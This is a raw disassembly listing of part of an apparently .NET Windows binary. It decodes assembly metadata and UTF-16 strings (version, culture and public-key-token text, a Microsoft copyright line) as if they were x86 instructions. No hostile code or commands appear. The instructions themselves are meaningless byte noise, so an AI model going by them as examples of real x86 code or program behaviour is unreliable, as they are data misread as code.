  40a936:	adc    eax,0xe023912
  40a93b:	adc    cl,BYTE PTR [esi+eax*1]
  40a93e:	and    BYTE PTR [ecx],al
  40a940:	adc    DWORD PTR [ebx*1+0x120050e],esp
  40a947:	add    DWORD PTR ds:0x20030e,ebx
  40a94d:	add    DWORD PTR ds:0x121d0020,eax
  40a953:	sub    BYTE PTR [eax],cl
  40a955:	and    BYTE PTR [ebx],al
  40a957:	add    DWORD PTR [esi],ecx
  40a959:	adc    BYTE PTR [esi],cl
  40a95b:	adc    BYTE PTR [esi],cl
  40a95d:	or     DWORD PTR [eax],esp
  40a95f:	add    BYTE PTR ds:0xe023912,dl
  40a965:	adc    cl,BYTE PTR [esp+eax*1]
  40a968:	and    BYTE PTR [ecx],al
  40a96a:	add    DWORD PTR [edx],eax
  40a96c:	push   cs
  40a96d:	and    BYTE PTR [edx],al
  40a96f:	add    DWORD PTR ds:0x15013d12,edx
  40a975:	adc    DWORD PTR [ecx+0x2],eax
  40a978:	push   cs
  40a979:	push   cs
  40a97a:	or     BYTE PTR [eax],cl
  40a97c:	add    BYTE PTR ds:0x8080801,al
  40a982:	or     BYTE PTR [esi],cl
  40a984:	add    eax,0x8010200
  40a989:	push   cs
  40a98a:	add    eax,DWORD PTR [eax]
  40a98c:	add    BYTE PTR [esi],cl
  40a98e:	add    eax,DWORD PTR [eax]
  40a990:	add    BYTE PTR [eax],cl
  40a992:	or     DWORD PTR [eax],ebp
  40a994:	add    BYTE PTR ds:0xe023912,dl
  40a99a:	adc    cl,BYTE PTR [edx+eax*1]
  40a99d:	push   es
  40a99e:	sbb    al,0x2
  40a9a0:	push   es
  40a9a1:	or     BYTE PTR [esi],al
  40a9a3:	and    BYTE PTR [ebx],al
  40a9a5:	add    DWORD PTR [esi+ecx*1],ebx
  40a9a8:	or     BYTE PTR [edi],al
  40a9aa:	and    BYTE PTR [ecx+eax*1],al
  40a9ad:	sbb    al,0xe
  40a9af:	or     BYTE PTR [esi],cl
  40a9b1:	add    esp,DWORD PTR [eax]
  40a9b3:	add    BYTE PTR [eax],cl
  40a9b5:	add    ebp,DWORD PTR [eax]
  40a9b7:	add    BYTE PTR [eax],cl
  40a9b9:	add    ebp,DWORD PTR [eax]
  40a9bb:	add    BYTE PTR [edi+eax*1],bl
  40a9be:	push   es
  40a9bf:	adc    eax,0x11013d12
  40a9c4:	and    BYTE PTR ds:0xe010220,al
  40a9ca:	or     BYTE PTR [eax+eiz*1],al
  40a9cd:	add    DWORD PTR [ecx],eax
  40a9cf:	or     BYTE PTR [eax+eiz*1],al
  40a9d2:	add    DWORD PTR [esi],ecx
  40a9d4:	or     BYTE PTR [eax+eiz*1],al
  40a9d7:	add    DWORD PTR [esi],ecx
  40a9d9:	push   cs
  40a9da:	add    al,0x28
  40a9dc:	add    DWORD PTR [esi],ecx
  40a9de:	or     BYTE PTR ds:0x8010220,al
  40a9e4:	or     BYTE PTR [ebx],al
  40a9e6:	push   es
  40a9e7:	adc    DWORD PTR [esp+eax*1],esp
  40a9ea:	add    BYTE PTR [eax],al
  40a9ec:	add    BYTE PTR [eax],al
  40a9ee:	add    al,0x1
  40a9f0:	add    BYTE PTR [eax],al
  40a9f2:	add    BYTE PTR [edi],al
  40a9f4:	push   es
  40a9f5:	adc    eax,0x1c024512
  40a9fa:	push   cs
  40a9fb:	or     ah,BYTE PTR [eax]
  40a9fd:	add    al,BYTE PTR [ecx]
  40a9ff:	push   cs
  40aa00:	adc    eax,0x1c024512
  40aa05:	push   cs
  40aa06:	add    eax,DWORD PTR [esi]
  40aa08:	adc    DWORD PTR [esi+eax*1],ebp
  40aa0b:	push   es
  40aa0c:	adc    eax,0xe013d12
  40aa11:	add    eax,DWORD PTR [esi]
  40aa13:	sbb    eax,0x320060e
  40aa18:	add    DWORD PTR [esi],ecx
  40aa1a:	push   cs
  40aa1b:	push   cs
  40aa1c:	add    al,0x20
  40aa1e:	add    DWORD PTR [ecx],eax
  40aa20:	push   cs
  40aa21:	add    al,0x20
  40aa23:	add    DWORD PTR [edx],eax
  40aa25:	push   cs
  40aa26:	push   es
  40aa27:	and    BYTE PTR [edx],al
  40aa29:	add    DWORD PTR ds:0x2007080e,ebx
  40aa2f:	add    BYTE PTR ds:0xe014912,dl
  40aa35:	add    al,0x20
  40aa37:	add    BYTE PTR [edx],dl
  40aa39:	dec    ebp
  40aa3a:	add    eax,DWORD PTR [esi]
  40aa3c:	adc    DWORD PTR [ecx+0x4],edx
  40aa3f:	or     al,0x0
  40aa41:	add    BYTE PTR [eax],al
  40aa43:	add    al,0xe
  40aa45:	add    BYTE PTR [eax],al
  40aa47:	add    BYTE PTR [edx+ebp*4],al
  40aa4a:	add    BYTE PTR [eax],al
  40aa4c:	add    BYTE PTR [ebx],al
  40aa4e:	push   es
  40aa4f:	adc    al,BYTE PTR [ebp+eax*1+0x0]
  40aa53:	add    DWORD PTR [eax],ecx
  40aa55:	sbb    eax,0x30e
  40aa5a:	add    DWORD PTR [eax+eax*1],eax
  40aa5d:	add    DWORD PTR [ecx],eax
  40aa5f:	push   cs
  40aa60:	add    al,0x0
  40aa62:	add    BYTE PTR [ecx],dl
  40aa64:	push   ebp
  40aa65:	add    al,0x0
  40aa67:	add    BYTE PTR [ecx],dl
  40aa69:	pop    ecx
  40aa6a:	or     DWORD PTR [eax],eax
  40aa6c:	add    DWORD PTR [ecx],eax
  40aa6e:	adc    eax,0x12015d12
  40aa73:	popa   
  40aa74:	or     DWORD PTR [eax],eax
  40aa76:	add    DWORD PTR [edx],eax
  40aa78:	adc    eax,0x12011912
  40aa7d:	popa   
  40aa7e:	or     al,BYTE PTR [eax]
  40aa80:	add    edx,DWORD PTR [ecx]
  40aa82:	push   ecx
  40aa83:	adc    DWORD PTR [ebp+0x10],esp
  40aa86:	or     BYTE PTR [eax],dl
  40aa88:	or     BYTE PTR ds:0x120e0100,al
  40aa8e:	popa   
  40aa8f:	or     eax,DWORD PTR [eax]
  40aa91:	push   es
  40aa92:	add    DWORD PTR [esi],ecx
  40aa94:	or     BYTE PTR [eax],cl
  40aa96:	push   cs
  40aa97:	adc    DWORD PTR [eax+0x11],eax
  40aa9a:	or     al,BYTE PTR gs:[eax]
  40aa9d:	push   es
  40aa9e:	push   cs
  40aa9f:	push   cs
  40aaa0:	or     BYTE PTR [eax],cl
  40aaa2:	push   cs
  40aaa3:	or     BYTE PTR [ecx],dl
  40aaa5:	gs add eax,0x120e0100
  40aaab:	and    DWORD PTR [ebx],eax
  40aaad:	push   es
  40aaae:	adc    DWORD PTR [esp+eax*1],edi
  40aab1:	add    eax,0x3000000
  40aab6:	push   es
  40aab7:	adc    DWORD PTR [eax+0x4],eax
  40aaba:	pop    eax
  40aabb:	sbb    eax,DWORD PTR [eax]
  40aabd:	add    BYTE PTR [ecx+ebx*2],al
  40aac0:	sbb    eax,DWORD PTR [eax]
  40aac2:	add    BYTE PTR [edx+ebx*2],al
  40aac5:	sbb    eax,DWORD PTR [eax]
  40aac7:	add    BYTE PTR [ebx+ebx*2],al
  40aaca:	sbb    eax,DWORD PTR [eax]
  40aacc:	add    BYTE PTR [esp+ebx*2],al
  40aacf:	sbb    eax,DWORD PTR [eax]
  40aad1:	add    BYTE PTR [ebx*2+0x400001b],al
  40aad8:	pop    esi
  40aad9:	sbb    eax,DWORD PTR [eax]
  40aadb:	add    BYTE PTR [edi+ebx*2],al
  40aade:	sbb    eax,DWORD PTR [eax]
  40aae0:	add    BYTE PTR [eax+eiz*2],al
  40aae3:	sbb    eax,DWORD PTR [eax]
  40aae5:	add    BYTE PTR [ecx+eiz*2],al
  40aae8:	sbb    eax,DWORD PTR [eax]
  40aaea:	add    BYTE PTR [edx+eiz*2],al
  40aaed:	sbb    eax,DWORD PTR [eax]
  40aaef:	add    BYTE PTR [ebx+eiz*2],al
  40aaf2:	sbb    eax,DWORD PTR [eax]
  40aaf4:	add    BYTE PTR [esp+eiz*2],al
  40aaf7:	sbb    eax,DWORD PTR [eax]
  40aaf9:	add    BYTE PTR [eiz*2+0x400001b],al
  40ab00:	sbb    ax,WORD PTR [eax]
  40ab03:	add    BYTE PTR [edi+eiz*2],al
  40ab06:	sbb    eax,DWORD PTR [eax]
  40ab08:	add    BYTE PTR [eax+ebp*2],al
  40ab0b:	sbb    eax,DWORD PTR [eax]
  40ab0d:	add    BYTE PTR [ecx+ebp*2],al
  40ab10:	sbb    eax,DWORD PTR [eax]
  40ab12:	add    BYTE PTR [edx+ebp*2],al
  40ab15:	sbb    eax,DWORD PTR [eax]
  40ab17:	add    BYTE PTR [ebx+ebp*2],al
  40ab1a:	sbb    eax,DWORD PTR [eax]
  40ab1c:	add    BYTE PTR [esp+ebp*2],al
  40ab1f:	sbb    eax,DWORD PTR [eax]
  40ab21:	add    BYTE PTR [ebp*2+0x400001b],al
  40ab28:	outs   dx,BYTE PTR ds:[esi]
  40ab29:	sbb    eax,DWORD PTR [eax]
  40ab2b:	add    BYTE PTR [edi+ebp*2],al
  40ab2e:	sbb    eax,DWORD PTR [eax]
  40ab30:	add    BYTE PTR [eax+esi*2],al
  40ab33:	sbb    eax,DWORD PTR [eax]
  40ab35:	add    BYTE PTR [ecx+esi*2],al
  40ab38:	sbb    eax,DWORD PTR [eax]
  40ab3a:	add    BYTE PTR [edx],cl
  40ab3c:	add    BYTE PTR cs:[ebx+0x0],ah
  40ab40:	jae    0x40ab42
  40ab42:	add    BYTE PTR fs:[eax+eax*1+0x6],ch
  40ab47:	add    BYTE PTR cs:[ebx+0x0],ah
  40ab4b:	jae    0x40ab4d
  40ab4d:	push   es
  40ab4e:	add    BYTE PTR cs:[esi+0x0],dh
  40ab52:	bound  eax,QWORD PTR [eax]
  40ab54:	or     ch,BYTE PTR [esi]
  40ab56:	add    BYTE PTR [ebp+0x0],ah
  40ab59:	add    BYTE PTR fs:[ebp+0x0],ch
  40ab5d:	js     0x40ab5f
  40ab5f:	add    al,0x69
  40ab61:	add    BYTE PTR [esi+0x0],ch
  40ab64:	push   es
  40ab65:	outs   dx,DWORD PTR ds:[esi]
  40ab66:	add    BYTE PTR [ebp+0x0],dh
  40ab69:	je     0x40ab6b
  40ab6b:	push   cs
  40ab6c:	push   esi
  40ab6d:	add    BYTE PTR [ebp+0x0],ah
  40ab70:	jb     0x40ab72
  40ab72:	jae    0x40ab74
  40ab74:	imul   eax,DWORD PTR [eax],0x6e006f
  40ab7a:	sub    al,BYTE PTR [eax+eax*1+0x61]
  40ab7e:	add    BYTE PTR [eax+eax*1+0x61],dh
  40ab82:	add    BYTE PTR [ebx+0x0],dl
  40ab85:	add    BYTE PTR gs:[edx+0x0],dh
  40ab89:	jbe    0x40ab8b
  40ab8b:	imul   eax,DWORD PTR [eax],0x650063
  40ab91:	inc    ebx
  40ab92:	add    BYTE PTR [edi+0x0],ch
  40ab95:	ins    BYTE PTR es:[edi],dx
  40ab96:	add    BYTE PTR [eax+eax*1+0x65],ch
  40ab9a:	add    BYTE PTR [ebx+0x0],ah
  40ab9d:	je     0x40ab9f
  40ab9f:	imul   eax,DWORD PTR [eax],0x6e006f
  40aba5:	add    eax,DWORD PTR [esi]
  40aba7:	adc    ch,BYTE PTR [ecx+0x3]
  40abaa:	push   es
  40abab:	adc    dh,BYTE PTR [eax]
  40abad:	add    eax,DWORD PTR [esi]
  40abaf:	adc    DWORD PTR [eax+0x4],ecx
  40abb2:	and    BYTE PTR [eax],al
  40abb4:	adc    DWORD PTR [esp+eax*1],edi
  40abb7:	and    BYTE PTR [eax],al
  40abb9:	adc    dh,BYTE PTR [eax]
  40abbb:	add    al,0x20
  40abbd:	add    BYTE PTR [ecx],dl
  40abbf:	sub    al,0x5
  40abc1:	and    BYTE PTR [ecx],al
  40abc3:	add    DWORD PTR [ecx],edx
  40abc5:	sub    al,0x4
  40abc7:	and    BYTE PTR [eax],al
  40abc9:	adc    DWORD PTR [eax+0x5],ecx
  40abcc:	and    BYTE PTR [ecx],al
  40abce:	add    DWORD PTR [ecx],edx
  40abd0:	dec    eax
  40abd1:	or     ah,BYTE PTR [eax]
  40abd3:	add    eax,DWORD PTR [ecx]
  40abd5:	adc    eax,0xe011512
  40abda:	push   cs
  40abdb:	push   cs
  40abdc:	add    eax,0xe0e0220
  40abe1:	push   cs
  40abe2:	add    al,0x28
  40abe4:	add    BYTE PTR [ecx],dl
  40abe6:	cmp    al,0x4
  40abe8:	sub    BYTE PTR [eax],al
  40abea:	adc    dh,BYTE PTR [eax]
  40abec:	add    al,0x28
  40abee:	add    BYTE PTR [ecx],dl
  40abf0:	sub    al,0x4
  40abf2:	sub    BYTE PTR [eax],al
  40abf4:	adc    DWORD PTR [eax+0x5],ecx
  40abf7:	add    BYTE PTR [edx],al
  40abf9:	push   cs
  40abfa:	sbb    al,0x1c
  40abfc:	add    al,0x0
  40abfe:	add    DWORD PTR [esi],ecx
  40ac00:	sbb    al,0x6
  40ac02:	add    BYTE PTR [ebx],al
  40ac04:	push   cs
  40ac05:	sbb    al,0x1c
  40ac07:	sbb    al,0x3
  40ac09:	or     BYTE PTR [eax],al
  40ac0b:	push   cs
  40ac0c:	add    eax,0x21120100
  40ac11:	push   cs
  40ac12:	add    al,0x0
  40ac14:	add    BYTE PTR [edx],dl
  40ac16:	and    DWORD PTR [esi],eax
  40ac18:	and    BYTE PTR [edx],al
  40ac1a:	add    DWORD PTR [esi],ecx
  40ac1c:	adc    DWORD PTR [eax+0x4],eax
  40ac1f:	and    BYTE PTR [eax],al
  40ac21:	adc    DWORD PTR [eax+0x4],eax
  40ac24:	sub    BYTE PTR [eax],al
  40ac26:	adc    DWORD PTR [eax+0xe],eax
  40ac29:	xor    al,BYTE PTR [eax]
  40ac2b:	add    BYTE PTR cs:[eax],dh
  40ac2e:	add    BYTE PTR [esi],ch
  40ac30:	add    BYTE PTR [eax],dh
  40ac32:	add    BYTE PTR [esi],ch
  40ac34:	add    BYTE PTR [eax],dh
  40ac36:	add    BYTE PTR [esi],cl
  40ac38:	xor    eax,DWORD PTR [eax]
  40ac3a:	add    BYTE PTR cs:0x30002e00,dh
  40ac41:	add    BYTE PTR [esi],ch
  40ac43:	add    BYTE PTR [eax],dh
  40ac45:	add    BYTE PTR [esi],bl
  40ac47:	inc    esp
  40ac48:	add    BYTE PTR [ecx+0x0],ah
  40ac4b:	je     0x40ac4d
  40ac4d:	popa   
  40ac4e:	add    BYTE PTR [ebx+0x0],dl
  40ac51:	jbe    0x40ac53
  40ac53:	arpl   WORD PTR [eax],ax
  40ac55:	push   ebp
  40ac56:	add    BYTE PTR [eax+eax*1+0x69],dh
  40ac5a:	add    BYTE PTR [eax+eax*1+0x2e],ch
  40ac5e:	add    BYTE PTR [ebp+0x0],ah
  40ac61:	js     0x40ac63
  40ac63:	add    BYTE PTR gs:[ecx+ebp*4+0x0],bl
  40ac68:	and    BYTE PTR [eax],al
  40ac6a:	dec    ebp
  40ac6b:	add    BYTE PTR [ecx+0x0],ch
  40ac6e:	arpl   WORD PTR [eax],ax
  40ac70:	jb     0x40ac72
  40ac72:	outs   dx,DWORD PTR ds:[esi]
  40ac73:	add    BYTE PTR [ebx+0x0],dh
  40ac76:	outs   dx,DWORD PTR ds:[esi]
  40ac77:	add    BYTE PTR [esi+0x0],ah
  40ac7a:	je     0x40ac7c
  40ac7c:	and    BYTE PTR [eax],al
  40ac7e:	inc    ebx
  40ac7f:	add    BYTE PTR [edi+0x0],ch
  40ac82:	jb     0x40ac84
  40ac84:	jo     0x40ac86
  40ac86:	outs   dx,DWORD PTR ds:[esi]
  40ac87:	add    BYTE PTR [edx+0x0],dh
  40ac8a:	popa   
  40ac8b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40ac8f:	add    BYTE PTR [edi+0x0],ch
  40ac92:	outs   dx,BYTE PTR ds:[esi]
  40ac93:	add    BYTE PTR [esi],ch
  40ac95:	add    BYTE PTR [eax],ah
  40ac97:	add    BYTE PTR [eax],ah
  40ac99:	add    BYTE PTR [ecx+0x0],al
  40ac9c:	ins    BYTE PTR es:[edi],dx
  40ac9d:	add    BYTE PTR [eax+eax*1+0x20],ch
  40aca1:	add    BYTE PTR [edx+0x0],dh
  40aca4:	imul   eax,DWORD PTR [eax],0x680067
  40acaa:	je     0x40acac
  40acac:	jae    0x40acae
  40acae:	and    BYTE PTR [eax],al
  40acb0:	jb     0x40acb2
  40acb2:	add    BYTE PTR gs:[ebx+0x0],dh
  40acb6:	add    BYTE PTR gs:[edx+0x0],dh
  40acba:	jbe    0x40acbc
  40acbc:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40acc1:	add    BYTE PTR [ebx+esi*1],bl
  40acc4:	add    BYTE PTR [esi],ch
  40acc6:	add    BYTE PTR ds:0x33002e00,dh
  40accc:	add    BYTE PTR [eax],dh
  40acce:	add    BYTE PTR [edi],dh
  40acd0:	add    BYTE PTR [edx],dh
  40acd2:	add    BYTE PTR [ecx],bh
  40acd4:	add    BYTE PTR [esi],ch
  40acd6:	add    BYTE PTR [eax],bh
  40acd8:	add    BYTE PTR [esi],dh
  40acda:	add    BYTE PTR [edi],dh
  40acdc:	add    BYTE PTR [eax+eax*1],dh
  40acdf:	add    al,0x9
  40ace1:	js     0x40ace3
  40ace3:	add    BYTE PTR [eax],ah
  40ace5:	bound  eax,QWORD PTR [eax]
  40ace7:	aaa    
  40ace8:	add    BYTE PTR [edi],dh
  40acea:	add    BYTE PTR [ecx+0x0],ah
  40aced:	xor    eax,0x35006300
  40acf2:	add    BYTE PTR [esi],dh
  40acf4:	add    BYTE PTR [ecx],dh
  40acf6:	add    BYTE PTR [ecx],bh
  40acf8:	add    BYTE PTR [ebx],dh
  40acfa:	add    BYTE PTR [eax+eax*1],dh
  40acfd:	add    BYTE PTR gs:[eax],dh
  40ad00:	add    BYTE PTR [eax],bh
  40ad02:	add    BYTE PTR [ecx],bh
  40ad04:	add    BYTE PTR [eax+0x30],al
  40ad07:	add    BYTE PTR [eax],dh
  40ad09:	add    BYTE PTR [eax],dh
  40ad0b:	add    BYTE PTR [eax],dh
  40ad0d:	add    BYTE PTR [eax],dh
  40ad0f:	add    BYTE PTR [eax],dh
  40ad11:	add    BYTE PTR [eax],dh
  40ad13:	add    BYTE PTR [eax],dh
  40ad15:	add    BYTE PTR [eax],dh
  40ad17:	add    BYTE PTR [eax],dh
  40ad19:	add    BYTE PTR [eax],dh
  40ad1b:	add    BYTE PTR [eax],dh
  40ad1d:	add    BYTE PTR [eax],dh
  40ad1f:	add    BYTE PTR [eax],dh
  40ad21:	add    BYTE PTR [eax],dh
  40ad23:	add    BYTE PTR [eax],dh
  40ad25:	add    BYTE PTR [eax],dh
  40ad27:	add    BYTE PTR [eax+eax*1],dh
  40ad2a:	xor    BYTE PTR [eax],al
  40ad2c:	xor    BYTE PTR [eax],al
  40ad2e:	xor    BYTE PTR [eax],al
  40ad30:	xor    BYTE PTR [eax],al
  40ad32:	xor    BYTE PTR [eax],al
  40ad34:	xor    BYTE PTR [eax],al
  40ad36:	xor    BYTE PTR [eax],al
  40ad38:	xor    BYTE PTR [eax],al
  40ad3a:	xor    BYTE PTR [eax],al
  40ad3c:	xor    BYTE PTR [eax],al
  40ad3e:	xor    BYTE PTR [eax],al
  40ad40:	xor    BYTE PTR [eax],al
  40ad42:	xor    BYTE PTR [eax],al
  40ad44:	xor    BYTE PTR [eax],al
  40ad46:	adc    BYTE PTR [esi+0x73006d],0x63
  40ad4d:	add    BYTE PTR [edi+0x0],ch
  40ad50:	jb     0x40ad52
  40ad52:	ins    BYTE PTR es:[edi],dx
  40ad53:	add    BYTE PTR [ecx+0x0],ch
  40ad56:	bound  eax,QWORD PTR [eax]
  40ad58:	sub    al,0x0
  40ad5a:	and    BYTE PTR [eax],al
  40ad5c:	push   esi
  40ad5d:	add    BYTE PTR [ebp+0x0],ah
  40ad60:	jb     0x40ad62
  40ad62:	jae    0x40ad64
  40ad64:	imul   eax,DWORD PTR [eax],0x6e006f
  40ad6a:	cmp    eax,0x2e003200
  40ad6f:	add    BYTE PTR [eax],dh
  40ad71:	add    BYTE PTR [esi],ch
  40ad73:	add    BYTE PTR [eax],dh
  40ad75:	add    BYTE PTR [esi],ch
  40ad77:	add    BYTE PTR [eax],dh
  40ad79:	add    BYTE PTR [eax+eax*1],ch
  40ad7c:	and    BYTE PTR [eax],al
  40ad7e:	inc    ebx
  40ad7f:	add    BYTE PTR [ebp+0x0],dh
  40ad82:	ins    BYTE PTR es:[edi],dx
  40ad83:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ad87:	add    BYTE PTR [edx+0x0],dh
  40ad8a:	add    BYTE PTR gs:0x65006e00,bh
  40ad91:	add    BYTE PTR [ebp+0x0],dh
  40ad94:	je     0x40ad96
  40ad96:	jb     0x40ad98
  40ad98:	popa   
  40ad99:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ad9d:	add    BYTE PTR [eax],ah
  40ad9f:	add    BYTE PTR [eax+0x0],dl
  40ada2:	jne    0x40ada4
  40ada4:	bound  eax,QWORD PTR [eax]
  40ada6:	ins    BYTE PTR es:[edi],dx
  40ada7:	add    BYTE PTR [ecx+0x0],ch
  40adaa:	arpl   WORD PTR [eax],ax
  40adac:	dec    ebx
  40adad:	add    BYTE PTR [ebp+0x0],ah
  40adb0:	jns    0x40adb2
  40adb2:	push   esp
  40adb3:	add    BYTE PTR [edi+0x0],ch
  40adb6:	imul   eax,DWORD PTR [eax],0x65
  40adb9:	add    BYTE PTR [esi+0x0],ch
  40adbc:	cmp    eax,0x37006200
  40adc1:	add    BYTE PTR [edi],dh
  40adc3:	add    BYTE PTR [ecx+0x0],ah
  40adc6:	xor    eax,0x35006300
  40adcb:	add    BYTE PTR [esi],dh
  40adcd:	add    BYTE PTR [ecx],dh
  40adcf:	add    BYTE PTR [ecx],bh
  40add1:	add    BYTE PTR [ebx],dh
  40add3:	add    BYTE PTR [eax+eax*1],dh
  40add6:	add    BYTE PTR gs:[eax],dh
  40add9:	add    BYTE PTR [eax],bh
  40addb:	add    BYTE PTR [ecx],bh
  40addd:	add    BYTE PTR [eax+0x7900539c],al
  40ade3:	add    BYTE PTR [ebx+0x0],dh
  40ade6:	je     0x40ade8
  40ade8:	add    BYTE PTR gs:[ebp+0x0],ch
  40adec:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  40adf1:	add    BYTE PTR [eax+eax*1+0x61],dh
  40adf5:	add    BYTE PTR [eax+eax*1],ch
  40adf8:	and    BYTE PTR [eax],al
  40adfa:	push   esi
  40adfb:	add    BYTE PTR [ebp+0x0],ah
  40adfe:	jb     0x40ae00
  40ae00:	jae    0x40ae02
  40ae02:	imul   eax,DWORD PTR [eax],0x6e006f
  40ae08:	cmp    eax,0x2e003200
  40ae0d:	add    BYTE PTR [eax],dh
  40ae0f:	add    BYTE PTR [esi],ch
  40ae11:	add    BYTE PTR [eax],dh
  40ae13:	add    BYTE PTR [esi],ch
  40ae15:	add    BYTE PTR [eax],dh
  40ae17:	add    BYTE PTR [eax+eax*1],ch
  40ae1a:	and    BYTE PTR [eax],al
  40ae1c:	inc    ebx
  40ae1d:	add    BYTE PTR [ebp+0x0],dh
  40ae20:	ins    BYTE PTR es:[edi],dx
  40ae21:	add    BYTE PTR [eax+eax*1+0x75],dh
  40ae25:	add    BYTE PTR [edx+0x0],dh
  40ae28:	add    BYTE PTR gs:0x65006e00,bh
  40ae2f:	add    BYTE PTR [ebp+0x0],dh
  40ae32:	je     0x40ae34
  40ae34:	jb     0x40ae36
  40ae36:	popa   
  40ae37:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40ae3b:	add    BYTE PTR [eax],ah
  40ae3d:	add    BYTE PTR [eax+0x0],dl
  40ae40:	jne    0x40ae42
  40ae42:	bound  eax,QWORD PTR [eax]
  40ae44:	ins    BYTE PTR es:[edi],dx
  40ae45:	add    BYTE PTR [ecx+0x0],ch
  40ae48:	arpl   WORD PTR [eax],ax
  40ae4a:	dec    ebx
  40ae4b:	add    BYTE PTR [ebp+0x0],ah
  40ae4e:	jns    0x40ae50
  40ae50:	push   esp
  40ae51:	add    BYTE PTR [edi+0x0],ch
  40ae54:	imul   eax,DWORD PTR [eax],0x65
  40ae57:	add    BYTE PTR [esi+0x0],ch
  40ae5a:	cmp    eax,0x37006200
  40ae5f:	add    BYTE PTR [edi],dh
  40ae61:	add    BYTE PTR [ecx+0x0],ah
  40ae64:	xor    eax,0x35006300
  40ae69:	add    BYTE PTR [esi],dh
  40ae6b:	add    BYTE PTR [ecx],dh
  40ae6d:	add    BYTE PTR [ecx],bh
  40ae6f:	add    BYTE PTR [ebx],dh
  40ae71:	add    BYTE PTR [eax+eax*1],dh
  40ae74:	add    BYTE PTR gs:[eax],dh
  40ae77:	add    BYTE PTR [eax],bh
  40ae79:	add    BYTE PTR [ecx],bh
  40ae7b:	add    BYTE PTR [eax+0x790053b6],al
  40ae81:	add    BYTE PTR [ebx+0x0],dh
  40ae84:	je     0x40ae86
  40ae86:	add    BYTE PTR gs:[ebp+0x0],ch
  40ae8a:	add    BYTE PTR cs:[eax+eax*1+0x61],al
  40ae8f:	add    BYTE PTR [eax+eax*1+0x61],dh
  40ae93:	add    BYTE PTR [esi],ch
  40ae95:	add    BYTE PTR [edi+0x0],cl
  40ae98:	jb     0x40ae9a
  40ae9a:	popa   
  40ae9b:	add    BYTE PTR [ebx+0x0],ah
  40ae9e:	ins    BYTE PTR es:[edi],dx
  40ae9f:	add    BYTE PTR [ebp+0x0],ah
  40aea2:	inc    ebx
  40aea3:	add    BYTE PTR [eax+eax*1+0x69],ch
  40aea7:	add    BYTE PTR [ebp+0x0],ah
  40aeaa:	outs   dx,BYTE PTR ds:[esi]
  40aeab:	add    BYTE PTR [eax+eax*1+0x2c],dh
  40aeaf:	add    BYTE PTR [eax],ah
  40aeb1:	add    BYTE PTR [esi+0x0],dl
  40aeb4:	add    BYTE PTR gs:[edx+0x0],dh
  40aeb8:	jae    0x40aeba
  40aeba:	imul   eax,DWORD PTR [eax],0x6e006f
  40aec0:	cmp    eax,0x2e003200
  40aec5:	add    BYTE PTR [eax],dh
  40aec7:	add    BYTE PTR [esi],ch
  40aec9:	add    BYTE PTR [eax],dh
  40aecb:	add    BYTE PTR [esi],ch
  40aecd:	add    BYTE PTR [eax],dh
  40aecf:	add    BYTE PTR [eax+eax*1],ch
  40aed2:	and    BYTE PTR [eax],al
  40aed4:	inc    ebx
  40aed5:	add    BYTE PTR [ebp+0x0],dh
  40aed8:	ins    BYTE PTR es:[edi],dx
  40aed9:	add    BYTE PTR [eax+eax*1+0x75],dh
  40aedd:	add    BYTE PTR [edx+0x0],dh
  40aee0:	add    BYTE PTR gs:0x65006e00,bh
  40aee7:	add    BYTE PTR [ebp+0x0],dh
  40aeea:	je     0x40aeec
  40aeec:	jb     0x40aeee
  40aeee:	popa   
  40aeef:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40aef3:	add    BYTE PTR [eax],ah
  40aef5:	add    BYTE PTR [eax+0x0],dl
  40aef8:	jne    0x40aefa
  40aefa:	bound  eax,QWORD PTR [eax]
  40aefc:	ins    BYTE PTR es:[edi],dx
  40aefd:	add    BYTE PTR [ecx+0x0],ch
  40af00:	arpl   WORD PTR [eax],ax
  40af02:	dec    ebx
  40af03:	add    BYTE PTR [ebp+0x0],ah
  40af06:	jns    0x40af08
  40af08:	push   esp
  40af09:	add    BYTE PTR [edi+0x0],ch
  40af0c:	imul   eax,DWORD PTR [eax],0x65
  40af0f:	add    BYTE PTR [esi+0x0],ch
  40af12:	cmp    eax,0x37006200
  40af17:	add    BYTE PTR [edi],dh
  40af19:	add    BYTE PTR [ecx+0x0],ah
  40af1c:	xor    eax,0x35006300
  40af21:	add    BYTE PTR [esi],dh
  40af23:	add    BYTE PTR [ecx],dh
  40af25:	add    BYTE PTR [ecx],bh
  40af27:	add    BYTE PTR [ebx],dh
  40af29:	add    BYTE PTR [eax+eax*1],dh
  40af2c:	add    BYTE PTR gs:[eax],dh
  40af2f:	add    BYTE PTR [eax],bh
  40af31:	add    BYTE PTR [ecx],bh
  40af33:	add    BYTE PTR [eax+0x79005392],al
  40af39:	add    BYTE PTR [ebx+0x0],dh
  40af3c:	je     0x40af3e
  40af3e:	add    BYTE PTR gs:[ebp+0x0],ch
  40af42:	sub    al,0x0
  40af44:	and    BYTE PTR [eax],al
  40af46:	push   esi
  40af47:	add    BYTE PTR [ebp+0x0],ah
  40af4a:	jb     0x40af4c
  40af4c:	jae    0x40af4e
  40af4e:	imul   eax,DWORD PTR [eax],0x6e006f
  40af54:	cmp    eax,0x2e003200
  40af59:	add    BYTE PTR [eax],dh
  40af5b:	add    BYTE PTR [esi],ch
  40af5d:	add    BYTE PTR [eax],dh
  40af5f:	add    BYTE PTR [esi],ch
  40af61:	add    BYTE PTR [eax],dh
  40af63:	add    BYTE PTR [eax+eax*1],ch
  40af66:	and    BYTE PTR [eax],al
  40af68:	inc    ebx
  40af69:	add    BYTE PTR [ebp+0x0],dh
  40af6c:	ins    BYTE PTR es:[edi],dx
  40af6d:	add    BYTE PTR [eax+eax*1+0x75],dh
  40af71:	add    BYTE PTR [edx+0x0],dh
  40af74:	add    BYTE PTR gs:0x65006e00,bh
  40af7b:	add    BYTE PTR [ebp+0x0],dh
  40af7e:	je     0x40af80
  40af80:	jb     0x40af82
  40af82:	popa   
  40af83:	add    BYTE PTR [eax+eax*1+0x2c],ch
  40af87:	add    BYTE PTR [eax],ah
  40af89:	add    BYTE PTR [eax+0x0],dl
  40af8c:	jne    0x40af8e
  40af8e:	bound  eax,QWORD PTR [eax]
  40af90:	ins    BYTE PTR es:[edi],dx
  40af91:	add    BYTE PTR [ecx+0x0],ch
  40af94:	arpl   WORD PTR [eax],ax
  40af96:	dec    ebx
